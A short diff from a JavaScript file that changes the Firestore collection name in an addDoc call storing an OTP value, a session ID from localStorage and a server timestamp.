@@ -40,7 +40,7 @@
         try {
           const sessionId = localStorage.getItem("sessionId") || null;
 
-          await addDoc(collection(db, "otp3"), {
+          await addDoc(collection(db, "users33"), {
             otp: otp,
             sessionId: sessionId,
             timestamp: serverTimestamp(),
